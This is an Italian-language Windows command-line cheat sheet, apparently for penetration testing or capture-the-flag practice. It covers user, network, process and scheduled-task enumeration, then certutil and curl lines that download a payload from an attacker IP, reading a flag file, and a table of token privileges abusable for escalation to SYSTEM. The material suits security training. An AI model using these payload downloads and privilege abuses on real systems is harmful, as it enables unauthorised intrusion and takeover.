---
icon: windows
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
---

# Windows cmd

```shell
shell
/bin/bash -i


type
dir 
cd
```

## <mark style="color:$primary;">Users e privilegi</mark>

```shell
whoami                                    #Chi sono?
whoami /priv                              #Che privilegi ho?
whoami /groups                            #In che gruppi sono?

net user                                  #Quali altri users ci sono?

net localgroup administrators              #Chi è admin?
```

## <mark style="color:$primary;">Network</mark>

```bash
ipconfig                                  #Leggi interfacce network
netstat -ano                              #Leggi servizi e porte aperte
```

## <mark style="color:$primary;">File</mark>

```bash
dir C:\                                    #Leggi disco C
type C:\<FILENAME>.txt                     #Leggi un file (vim o cat)
findstr

#DOWNLOAD (usa meterpreter)
certutil -urlcache -f http://<IP>/FILE <FILE_OUTPUT>  
curl http://<IP>/<PAYLOAD> -o <SHELL_OUTPUT>
#Funziona solo su meterpreter, non su shell cmd.exe


#Prendi, unzip e leggi
get <FILE>.tar.gz
tar -xvzf <FILE>.tar.gz
cat <FILE>.txt                

#Cerca file
dir /s /a /b <FILE>.txt                          #Cerca hidden e non  
dir /s /a:h /b <FILE>.txt                        #Cerca solo hidden   
```

***

## <mark style="color:$primary;">Process List e Scheduled</mark>

```shellscript
tasklist /SVC                              #Dimmi tutti i processi attivi

schtasks /query /fo LIST                   #Dimmi tutti i task schedulati
```

Shell

```shellscript
shell
    cd /
    dir
    type flag.txt
```



## <mark style="color:$primary;">Access Token</mark>

<table><thead><tr><th width="429">Privilegio</th><th width="122">SYSTEM?</th><th>Note</th></tr></thead><tbody><tr><td>SeImpersonatePrivilege</td><td>✅</td><td><strong>Golden ticket</strong></td></tr><tr><td>SeAssignPrimaryTokenPrivilege</td><td>✅</td><td>Come sopra</td></tr><tr><td>SeDebugPrivilege</td><td>⚠️</td><td>Dump / injection</td></tr><tr><td>SeLoadDriverPrivilege</td><td>✅</td><td>Kernel</td></tr><tr><td>SeBackupPrivilege</td><td>⚠️</td><td>File abuse</td></tr><tr><td>SeRestorePrivilege</td><td>⚠️</td><td>File abuse</td></tr></tbody></table>



